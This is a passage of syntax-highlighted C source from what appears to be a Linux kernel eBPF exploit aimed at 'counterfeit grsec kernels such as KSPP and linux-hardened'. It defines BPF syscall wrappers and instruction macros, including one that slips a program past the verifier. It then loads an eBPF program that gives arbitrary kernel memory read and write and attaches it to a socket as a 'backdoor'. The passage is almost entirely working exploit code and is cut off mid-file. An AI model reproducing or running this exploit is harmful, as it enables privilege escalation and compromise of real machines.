<span class="w">           </span><span class="kt">int</span><span class="w"> </span><span class="n">max_entries</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">map_flags</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">    </span><span class="k">union</span><span class="w"> </span><span class="nc">bpf_attr</span><span class="w"> </span><span class="n">attr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="p">.</span><span class="n">map_type</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">map_type</span><span class="p">,</span>
<span class="w">        </span><span class="p">.</span><span class="n">key_size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">key_size</span><span class="p">,</span>
<span class="w">        </span><span class="p">.</span><span class="n">value_size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">value_size</span><span class="p">,</span>
<span class="w">        </span><span class="p">.</span><span class="n">max_entries</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">max_entries</span>
<span class="w">    </span><span class="p">};</span>

<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">syscall</span><span class="p">(</span><span class="n">__NR_bpf</span><span class="p">,</span><span class="w"> </span><span class="n">BPF_MAP_CREATE</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">attr</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">attr</span><span class="p">));</span>
<span class="p">}</span>

<span class="kt">int</span><span class="w"> </span><span class="nf">bpf_update_elem</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">value</span><span class="p">,</span><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">flags</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">    </span><span class="k">union</span><span class="w"> </span><span class="nc">bpf_attr</span><span class="w"> </span><span class="n">attr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="p">.</span><span class="n">map_fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fd</span><span class="p">,</span>
<span class="w">        </span><span class="p">.</span><span class="n">key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ptr_to_u64</span><span class="p">(</span><span class="n">key</span><span class="p">),</span>
<span class="w">        </span><span class="p">.</span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ptr_to_u64</span><span class="p">(</span><span class="n">value</span><span class="p">),</span>
<span class="w">        </span><span class="p">.</span><span class="n">flags</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">flags</span><span class="p">,</span>
<span class="w">    </span><span class="p">};</span>

<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">syscall</span><span class="p">(</span><span class="n">__NR_bpf</span><span class="p">,</span><span class="w"> </span><span class="n">BPF_MAP_UPDATE_ELEM</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">attr</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">attr</span><span class="p">));</span>
<span class="p">}</span>

<span class="kt">int</span><span class="w"> </span><span class="nf">bpf_lookup_elem</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">value</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">    </span><span class="k">union</span><span class="w"> </span><span class="nc">bpf_attr</span><span class="w"> </span><span class="n">attr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="p">.</span><span class="n">map_fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fd</span><span class="p">,</span>
<span class="w">        </span><span class="p">.</span><span class="n">key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ptr_to_u64</span><span class="p">(</span><span class="n">key</span><span class="p">),</span>
<span class="w">        </span><span class="p">.</span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ptr_to_u64</span><span class="p">(</span><span class="n">value</span><span class="p">),</span>
<span class="w">    </span><span class="p">};</span>

<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">syscall</span><span class="p">(</span><span class="n">__NR_bpf</span><span class="p">,</span><span class="w"> </span><span class="n">BPF_MAP_LOOKUP_ELEM</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">attr</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">attr</span><span class="p">));</span>
<span class="p">}</span>

<span class="cp">#define BPF_ALU64_IMM(OP, DST, IMM)             \</span>
<span class="cp">    ((struct bpf_insn) {                    \</span>
<span class="cp">        .code  = BPF_ALU64 | BPF_OP(OP) | BPF_K,    \</span>
<span class="cp">        .dst_reg = DST,                 \</span>
<span class="cp">        .src_reg = 0,                   \</span>
<span class="cp">        .off   = 0,                 \</span>
<span class="cp">        .imm   = IMM })</span>

<span class="cp">#define BPF_MOV64_REG(DST, SRC)                 \</span>
<span class="cp">    ((struct bpf_insn) {                    \</span>
<span class="cp">        .code  = BPF_ALU64 | BPF_MOV | BPF_X,       \</span>
<span class="cp">        .dst_reg = DST,                 \</span>
<span class="cp">        .src_reg = SRC,                 \</span>
<span class="cp">        .off   = 0,                 \</span>
<span class="cp">        .imm   = 0 })</span>

<span class="cp">#define BPF_MOV32_REG(DST, SRC)                 \</span>
<span class="cp">    ((struct bpf_insn) {                    \</span>
<span class="cp">        .code  = BPF_ALU | BPF_MOV | BPF_X,     \</span>
<span class="cp">        .dst_reg = DST,                 \</span>
<span class="cp">        .src_reg = SRC,                 \</span>
<span class="cp">        .off   = 0,                 \</span>
<span class="cp">        .imm   = 0 })</span>

<span class="cp">#define BPF_MOV64_IMM(DST, IMM)                 \</span>
<span class="cp">    ((struct bpf_insn) {                    \</span>
<span class="cp">        .code  = BPF_ALU64 | BPF_MOV | BPF_K,       \</span>
<span class="cp">        .dst_reg = DST,                 \</span>
<span class="cp">        .src_reg = 0,                   \</span>
<span class="cp">        .off   = 0,                 \</span>
<span class="cp">        .imm   = IMM })</span>

<span class="cp">#define BPF_MOV32_IMM(DST, IMM)                 \</span>
<span class="cp">    ((struct bpf_insn) {                    \</span>
<span class="cp">        .code  = BPF_ALU | BPF_MOV | BPF_K,     \</span>
<span class="cp">        .dst_reg = DST,                 \</span>
<span class="cp">        .src_reg = 0,                   \</span>
<span class="cp">        .off   = 0,                 \</span>
<span class="cp">        .imm   = IMM })</span>

<span class="cp">#define BPF_LD_IMM64(DST, IMM)                  \</span>
<span class="cp">    BPF_LD_IMM64_RAW(DST, 0, IMM)</span>

<span class="cp">#define BPF_LD_IMM64_RAW(DST, SRC, IMM)             \</span>
<span class="cp">    ((struct bpf_insn) {                    \</span>
<span class="cp">        .code  = BPF_LD | BPF_DW | BPF_IMM,     \</span>
<span class="cp">        .dst_reg = DST,                 \</span>
<span class="cp">        .src_reg = SRC,                 \</span>
<span class="cp">        .off   = 0,                 \</span>
<span class="cp">        .imm   = (__u32) (IMM) }),          \</span>
<span class="cp">    ((struct bpf_insn) {                    \</span>
<span class="cp">        .code  = 0,                     \</span>
<span class="cp">        .dst_reg = 0,                   \</span>
<span class="cp">        .src_reg = 0,                   \</span>
<span class="cp">        .off   = 0,                 \</span>
<span class="cp">        .imm   = ((__u64) (IMM)) &gt;&gt; 32 })</span>

<span class="cp">#ifndef BPF_PSEUDO_MAP_FD</span>
<span class="cp"># define BPF_PSEUDO_MAP_FD  1</span>
<span class="cp">#endif</span>

<span class="cp">#define BPF_LD_MAP_FD(DST, MAP_FD)              \</span>
<span class="cp">    BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)</span>

<span class="cp">#define BPF_LDX_MEM(SIZE, DST, SRC, OFF)            \</span>
<span class="cp">    ((struct bpf_insn) {                    \</span>
<span class="cp">        .code  = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM,    \</span>
<span class="cp">        .dst_reg = DST,                 \</span>
<span class="cp">        .src_reg = SRC,                 \</span>
<span class="cp">        .off   = OFF,                   \</span>
<span class="cp">        .imm   = 0 })</span>

<span class="cp">#define BPF_STX_MEM(SIZE, DST, SRC, OFF)            \</span>
<span class="cp">    ((struct bpf_insn) {                    \</span>
<span class="cp">        .code  = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM,    \</span>
<span class="cp">        .dst_reg = DST,                 \</span>
<span class="cp">        .src_reg = SRC,                 \</span>
<span class="cp">        .off   = OFF,                   \</span>
<span class="cp">        .imm   = 0 })</span>

<span class="cp">#define BPF_ST_MEM(SIZE, DST, OFF, IMM)             \</span>
<span class="cp">    ((struct bpf_insn) {                    \</span>
<span class="cp">        .code  = BPF_ST | BPF_SIZE(SIZE) | BPF_MEM, \</span>
<span class="cp">        .dst_reg = DST,                 \</span>
<span class="cp">        .src_reg = 0,                   \</span>
<span class="cp">        .off   = OFF,                   \</span>
<span class="cp">        .imm   = IMM })</span>

<span class="cp">#define BPF_JMP_IMM(OP, DST, IMM, OFF)              \</span>
<span class="cp">    ((struct bpf_insn) {                    \</span>
<span class="cp">        .code  = BPF_JMP | BPF_OP(OP) | BPF_K,      \</span>
<span class="cp">        .dst_reg = DST,                 \</span>
<span class="cp">        .src_reg = 0,                   \</span>
<span class="cp">        .off   = OFF,                   \</span>
<span class="cp">        .imm   = IMM })</span>

<span class="cp">#define BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM)          \</span>
<span class="cp">    ((struct bpf_insn) {                    \</span>
<span class="cp">        .code  = CODE,                  \</span>
<span class="cp">        .dst_reg = DST,                 \</span>
<span class="cp">        .src_reg = SRC,                 \</span>
<span class="cp">        .off   = OFF,                   \</span>
<span class="cp">        .imm   = IMM })</span>

<span class="cp">#define BPF_EXIT_INSN()                     \</span>
<span class="cp">    ((struct bpf_insn) {                    \</span>
<span class="cp">        .code  = BPF_JMP | BPF_EXIT,            \</span>
<span class="cp">        .dst_reg = 0,                   \</span>
<span class="cp">        .src_reg = 0,                   \</span>
<span class="cp">        .off   = 0,                 \</span>
<span class="cp">        .imm   = 0 })</span>

<span class="cp">#define BPF_DISABLE_VERIFIER()                                                       \</span>
<span class="cp">    BPF_MOV32_IMM(BPF_REG_2, 0xFFFFFFFF),             </span><span class="cm">/* r2 = (u32)0xFFFFFFFF   */</span><span class="cp">   \</span>
<span class="cp">    BPF_JMP_IMM(BPF_JNE, BPF_REG_2, 0xFFFFFFFF, 2),   </span><span class="cm">/* if (r2 == -1) {        */</span><span class="cp">   \</span>
<span class="cp">    BPF_MOV64_IMM(BPF_REG_0, 0),                      </span><span class="cm">/*   exit(0);             */</span><span class="cp">   \</span>
<span class="cp">    BPF_EXIT_INSN()                                   </span><span class="cm">/* }                      */</span><span class="cp">   \</span>

<span class="cp">#define BPF_MAP_GET(idx, dst)                                                        \</span>
<span class="cp">    BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),              </span><span class="cm">/* r1 = r9                */</span><span class="cp">   \</span>
<span class="cp">    BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),             </span><span class="cm">/* r2 = fp                */</span><span class="cp">   \</span>
<span class="cp">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),            </span><span class="cm">/* r2 = fp - 4            */</span><span class="cp">   \</span>
<span class="cp">    BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx),           </span><span class="cm">/* *(u32 *)(fp - 4) = idx */</span><span class="cp">   \</span>
<span class="cp">    BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),             \</span>
<span class="cp">    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),            </span><span class="cm">/* if (r0 == 0)           */</span><span class="cp">   \</span>
<span class="cp">    BPF_EXIT_INSN(),                                  </span><span class="cm">/*   exit(0);             */</span><span class="cp">   \</span>
<span class="cp">    BPF_LDX_MEM(BPF_DW, (dst), BPF_REG_0, 0)          </span><span class="cm">/* r_dst = *(u64 *)(r0)   */</span><span class="cp">              </span>

<span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">load_prog</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">struct</span><span class="w"> </span><span class="nc">bpf_insn</span><span class="w"> </span><span class="n">prog</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">BPF_DISABLE_VERIFIER</span><span class="p">(),</span>

<span class="w">        </span><span class="n">BPF_STX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span><span class="w"> </span><span class="n">BPF_REG_10</span><span class="p">,</span><span class="w"> </span><span class="n">BPF_REG_1</span><span class="p">,</span><span class="w"> </span><span class="mi">-16</span><span class="p">),</span><span class="w">   </span><span class="cm">/* *(fp - 16) = r1       */</span>

<span class="w">        </span><span class="n">BPF_LD_MAP_FD</span><span class="p">(</span><span class="n">BPF_REG_9</span><span class="p">,</span><span class="w"> </span><span class="n">mapfd</span><span class="p">),</span>

<span class="w">        </span><span class="n">BPF_MAP_GET</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">BPF_REG_6</span><span class="p">),</span><span class="w">                         </span><span class="cm">/* r6 = op               */</span>
<span class="w">        </span><span class="n">BPF_MAP_GET</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">BPF_REG_7</span><span class="p">),</span><span class="w">                         </span><span class="cm">/* r7 = address          */</span>
<span class="w">        </span><span class="n">BPF_MAP_GET</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="n">BPF_REG_8</span><span class="p">),</span><span class="w">                         </span><span class="cm">/* r8 = value            */</span>

<span class="w">        </span><span class="cm">/* store map slot address in r2 */</span>
<span class="w">        </span><span class="n">BPF_MOV64_REG</span><span class="p">(</span><span class="n">BPF_REG_2</span><span class="p">,</span><span class="w"> </span><span class="n">BPF_REG_0</span><span class="p">),</span><span class="w">               </span><span class="cm">/* r2 = r0               */</span>
<span class="w">        </span><span class="n">BPF_MOV64_IMM</span><span class="p">(</span><span class="n">BPF_REG_0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">),</span><span class="w">                       </span><span class="cm">/* r0 = 0  for exit(0)   */</span>

<span class="w">        </span><span class="n">BPF_JMP_IMM</span><span class="p">(</span><span class="n">BPF_JNE</span><span class="p">,</span><span class="w"> </span><span class="n">BPF_REG_6</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">),</span><span class="w">             </span><span class="cm">/* if (op == 0)          */</span>
<span class="w">        </span><span class="cm">/* get fp */</span>
<span class="w">        </span><span class="n">BPF_STX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span><span class="w"> </span><span class="n">BPF_REG_2</span><span class="p">,</span><span class="w"> </span><span class="n">BPF_REG_10</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">),</span>
<span class="w">        </span><span class="n">BPF_EXIT_INSN</span><span class="p">(),</span>

<span class="w">        </span><span class="n">BPF_JMP_IMM</span><span class="p">(</span><span class="n">BPF_JNE</span><span class="p">,</span><span class="w"> </span><span class="n">BPF_REG_6</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="p">),</span><span class="w">             </span><span class="cm">/* else if (op == 1)     */</span>
<span class="w">        </span><span class="cm">/* get skbuff */</span>
<span class="w">        </span><span class="n">BPF_LDX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span><span class="w"> </span><span class="n">BPF_REG_3</span><span class="p">,</span><span class="w"> </span><span class="n">BPF_REG_10</span><span class="p">,</span><span class="w"> </span><span class="mi">-16</span><span class="p">),</span>
<span class="w">        </span><span class="n">BPF_STX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span><span class="w"> </span><span class="n">BPF_REG_2</span><span class="p">,</span><span class="w"> </span><span class="n">BPF_REG_3</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">),</span>
<span class="w">        </span><span class="n">BPF_EXIT_INSN</span><span class="p">(),</span>

<span class="w">        </span><span class="n">BPF_JMP_IMM</span><span class="p">(</span><span class="n">BPF_JNE</span><span class="p">,</span><span class="w"> </span><span class="n">BPF_REG_6</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="p">),</span><span class="w">             </span><span class="cm">/* else if (op == 2)     */</span>
<span class="w">        </span><span class="cm">/* read */</span>
<span class="w">        </span><span class="n">BPF_LDX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span><span class="w"> </span><span class="n">BPF_REG_3</span><span class="p">,</span><span class="w"> </span><span class="n">BPF_REG_7</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">),</span>
<span class="w">        </span><span class="n">BPF_STX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span><span class="w"> </span><span class="n">BPF_REG_2</span><span class="p">,</span><span class="w"> </span><span class="n">BPF_REG_3</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">),</span>
<span class="w">        </span><span class="n">BPF_EXIT_INSN</span><span class="p">(),</span>
<span class="w">        </span><span class="cm">/* else                  */</span>
<span class="w">        </span><span class="cm">/* write */</span>
<span class="w">        </span><span class="n">BPF_STX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span><span class="w"> </span><span class="n">BPF_REG_7</span><span class="p">,</span><span class="w"> </span><span class="n">BPF_REG_8</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">),</span><span class="w"> </span>
<span class="w">        </span><span class="n">BPF_EXIT_INSN</span><span class="p">(),</span>

<span class="w">    </span><span class="p">};</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">bpf_prog_load</span><span class="p">(</span><span class="n">BPF_PROG_TYPE_SOCKET_FILTER</span><span class="p">,</span><span class="w"> </span><span class="n">prog</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">prog</span><span class="p">),</span><span class="w"> </span><span class="s">&quot;GPL&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span><span class="w"> </span><span class="nf">info</span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">fmt</span><span class="p">,</span><span class="w"> </span><span class="p">...)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kt">va_list</span><span class="w"> </span><span class="n">args</span><span class="p">;</span>
<span class="w">    </span><span class="n">va_start</span><span class="p">(</span><span class="n">args</span><span class="p">,</span><span class="w"> </span><span class="n">fmt</span><span class="p">);</span>
<span class="w">    </span><span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;[.] &quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">vfprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span><span class="w"> </span><span class="n">fmt</span><span class="p">,</span><span class="w"> </span><span class="n">args</span><span class="p">);</span>
<span class="w">    </span><span class="n">va_end</span><span class="p">(</span><span class="n">args</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span><span class="w"> </span><span class="nf">msg</span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">fmt</span><span class="p">,</span><span class="w"> </span><span class="p">...)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kt">va_list</span><span class="w"> </span><span class="n">args</span><span class="p">;</span>
<span class="w">    </span><span class="n">va_start</span><span class="p">(</span><span class="n">args</span><span class="p">,</span><span class="w"> </span><span class="n">fmt</span><span class="p">);</span>
<span class="w">    </span><span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;[*] &quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">vfprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span><span class="w"> </span><span class="n">fmt</span><span class="p">,</span><span class="w"> </span><span class="n">args</span><span class="p">);</span>
<span class="w">    </span><span class="n">va_end</span><span class="p">(</span><span class="n">args</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span><span class="w"> </span><span class="nf">redact</span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">fmt</span><span class="p">,</span><span class="w"> </span><span class="p">...)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kt">va_list</span><span class="w"> </span><span class="n">args</span><span class="p">;</span>
<span class="w">    </span><span class="n">va_start</span><span class="p">(</span><span class="n">args</span><span class="p">,</span><span class="w"> </span><span class="n">fmt</span><span class="p">);</span>
<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">doredact</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;[!] ( ( R E D A C T E D ) )</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="k">return</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;[*] &quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">vfprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span><span class="w"> </span><span class="n">fmt</span><span class="p">,</span><span class="w"> </span><span class="n">args</span><span class="p">);</span>
<span class="w">    </span><span class="n">va_end</span><span class="p">(</span><span class="n">args</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span><span class="w"> </span><span class="nf">fail</span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">fmt</span><span class="p">,</span><span class="w"> </span><span class="p">...)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kt">va_list</span><span class="w"> </span><span class="n">args</span><span class="p">;</span>
<span class="w">    </span><span class="n">va_start</span><span class="p">(</span><span class="n">args</span><span class="p">,</span><span class="w"> </span><span class="n">fmt</span><span class="p">);</span>
<span class="w">    </span><span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;[!] &quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">vfprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span><span class="w"> </span><span class="n">fmt</span><span class="p">,</span><span class="w"> </span><span class="n">args</span><span class="p">);</span>
<span class="w">    </span><span class="n">va_end</span><span class="p">(</span><span class="n">args</span><span class="p">);</span>
<span class="w">    </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span><span class="w"> </span>
<span class="nf">initialize</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">info</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">info</span><span class="p">(</span><span class="s">&quot;t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">info</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">info</span><span class="p">(</span><span class="s">&quot;  ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">info</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>

<span class="w">    </span><span class="n">redact</span><span class="p">(</span><span class="s">&quot;creating bpf map</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">mapfd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">bpf_create_map</span><span class="p">(</span><span class="n">BPF_MAP_TYPE_ARRAY</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">),</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="kt">long</span><span class="w"> </span><span class="kt">long</span><span class="p">),</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">mapfd</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">fail</span><span class="p">(</span><span class="s">&quot;failed to create bpf map: &#39;%s&#39;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="n">redact</span><span class="p">(</span><span class="s">&quot;sneaking evil bpf past the verifier</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">progfd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">load_prog</span><span class="p">();</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">progfd</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">errno</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">EACCES</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="n">msg</span><span class="p">(</span><span class="s">&quot;log:</span><span class="se">\n</span><span class="s">%s&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">bpf_log_buf</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="n">fail</span><span class="p">(</span><span class="s">&quot;failed to load prog &#39;%s&#39;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="n">redact</span><span class="p">(</span><span class="s">&quot;creating socketpair()</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">socketpair</span><span class="p">(</span><span class="n">AF_UNIX</span><span class="p">,</span><span class="w"> </span><span class="n">SOCK_DGRAM</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">sockets</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">fail</span><span class="p">(</span><span class="s">&quot;failed to create socket pair &#39;%s&#39;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="n">redact</span><span class="p">(</span><span class="s">&quot;attaching bpf backdoor to socket</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">sockets</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="w"> </span><span class="n">SOL_SOCKET</span><span class="p">,</span><span class="w"> </span><span class="n">SO_ATTACH_BPF</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">progfd</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">progfd</span><span class="p">))</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">fail</span><span class="p">(</span><span class="s">&quot;setsockopt &#39;%s&#39;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">writemsg</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
